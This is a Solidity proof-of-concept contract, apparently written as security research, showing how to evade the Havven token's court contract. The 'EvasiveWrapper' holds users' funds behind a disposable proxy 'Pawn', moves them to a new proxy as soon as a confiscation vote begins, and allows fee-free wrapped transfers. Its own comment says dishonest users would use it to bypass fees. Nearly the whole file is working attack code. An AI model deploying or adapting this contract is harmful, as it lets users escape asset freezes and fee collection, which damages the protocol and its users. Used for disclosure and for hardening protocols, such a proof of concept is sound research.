/*
 * EvasiveWrapper.sol
 *
 * This is a proof-of concept contract to demonstrate a 
 * method for avoiding the Havven court contract.
 *
 * This contract is not production-ready and should not be used
 * to store any value. The authors do not condone the use of this
 * contract. This contract exists only for research purposes.
 *
 * This contract has critical exploits which will jeopardise
 * deployment in a production environment.
 */
pragma solidity ^0.4.19;

/*
 * A 'lite' interface of the Court contract
 */
contract SlimCourt {
    mapping(address => uint) public voteStartTimes;
}

/*
 * A 'lite' interface of the EtherNomin contract
 */
contract SlimEtherNomin {
    SlimCourt public court;
    function balanceOf(address who) public view returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
	function transferFrom(address from, address to, uint256 value) public returns (bool);
    function priceToSpend(uint _value) public view returns (uint);
}

/*
 * A throw-away contract to store all funds.
 * 
 * Will forward all unknown calls from owner to the target
 * nomin contract, allowing it to act as a proxy.
 */
contract Pawn {
	address public owner;
	SlimEtherNomin public target;

	function Pawn(address _target) public {
		owner = msg.sender;
		target = SlimEtherNomin(_target);
	}
	
	function() public {
		require(msg.sender == owner);
		require(target.call(msg.data));
    }
}
/*
 * Main contract in which dishonest users will use to 
 * bypass fees.
 * 
 * This contract address can be frozen by the court
 * with no effect.
 */
contract EvasiveWrapper {
	SlimEtherNomin public nomin;	// the true nomin contract
	address public pawn;			// the current pawn contract

	uint public totalSupply;
	mapping(address => uint) public balanceOf;

	function EvasiveWrapper(address _nomin) public {
		nomin = SlimEtherNomin(_nomin);
		pawn = new Pawn(nomin);
	}

	/*
	 * The address which should be given an 
	 * allowance of nomin. May change.
	 */
	function depositAddress()
		public 
		view
		returns (address a) 
	{
		return pawn;
	}

	/*
	 * Perform a wrapped, fee-free transfer.
	 */
	function transfer(address _to, uint _value) 
		public 
		evadeFirst
	{
		require(balanceOf[msg.sender] >= _value);
		
		balanceOf[_to] += _value;
		balanceOf[msg.sender] -= _value;
	}

	/*
	 * Withdraw nomins from this wrapper into another
	 * address. This will incur nomin fees.
	 */
	function exitWrapper(address _to, uint _value) public {
		require(balanceOf[msg.sender] >= _value);
		
		balanceOf[msg.sender] -= _value;

		SlimEtherNomin wrappedNomin = SlimEtherNomin(pawn);
		wrappedNomin.transfer(_to, _value);
	}

	/*
	 * Import some tokens into the contract.
	 * 
	 * The calling address must have made an allowance
	 * available to the current pawn contract.
	 */
	function importFunds(uint _value) public {
		SlimEtherNomin wrappedNomin = SlimEtherNomin(pawn);
		wrappedNomin.transferFrom(msg.sender, pawn, _value);
		balanceOf[msg.sender] = balanceOf[msg.sender] + _value;
	}

	/*
	 * Check to see if a confiscation vote has been
	 * started against the current pawn. If so,
	 * call the newPawn() function.
	 */
	function evade() public {
		SlimCourt court = nomin.court();
		if(court.voteStartTimes(pawn) > 0)  {
			newPawn();
		}
	}

	/*
	 * Create a new pawn and transfer the balance of the
	 * current pawn to it. The old pawn is discarded.
	 * 
	 * It is critical this function is called in the 
	 * time period between the start of confiscation vote
	 * and its confirmation. Otherwise, all funds will be frozen.
	 */
	function newPawn() internal {
		SlimEtherNomin oldPawn = SlimEtherNomin(pawn);
		pawn = new Pawn(nomin);
		uint balanceToMigrate = nomin.balanceOf(oldPawn);
		if(balanceToMigrate > 0) {
			uint balanceBeforeFee = nomin.priceToSpend(balanceToMigrate);
		    oldPawn.transfer(pawn, balanceBeforeFee);
		}
		NewPawn(oldPawn, pawn);
	}

	modifier evadeFirst() {
		evade();
		_;
	}

	event NewPawn(address oldPawn, address newPawn);
}
